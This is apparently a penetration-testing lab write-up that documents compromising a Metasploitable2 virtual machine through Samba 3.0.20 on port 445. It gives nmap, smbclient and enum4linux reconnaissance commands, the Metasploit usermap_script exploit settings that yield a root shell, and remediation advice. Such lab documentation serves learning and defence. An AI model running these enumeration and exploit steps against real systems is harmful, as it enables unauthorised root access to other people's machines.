# Metasploitable2 â€“ Samba 3.0.20 (Port 445)

**Date:** 2025-09-05  
**Target:** 192.168.56.101  
**Attacker:** Kali Linux 2025.2 (192.168.56.102)  

---

## Recon

Nmap identified port 445 open running Samba 3.0.20:

```bash
nmap -sV -p 445 192.168.56.101 -oN nmap_samba_results.txt

Results:

445/tcp open netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)

Enumerating shares with smbclient:
smbclient -L //192.168.56.101/ -N
smbclient //192.168.56.101/tmp -N

Enum4linux enumeration:
enum4linux -a 192.168.56.101 | tee smb_enum_results.txt
Discovered users/groups such as backup, daemon, games, etc.

Exploitation (Metasploit)
use exploit/multi/samba/usermap_script
set RHOST 192.168.56.101
set LHOST 192.168.56.102
exploit

Proof of Compromise
Successful exploitation resulted in a root shell:
whoami
root
uname -a
Linux metasploitable 2.6.24-16-server ...

## Artifacts
- [Nmap results](./nmap_samba_results.txt)
- [SMB enumeration](./smb_enum_results.txt)
- Screenshot: ![Root shell](./images/root-shell-samba.png)

Remediation
Upgrade Samba to a secure version (>= 3.0.25).
Disable anonymous SMB access where not required.
Restrict SMB to trusted networks only.

---


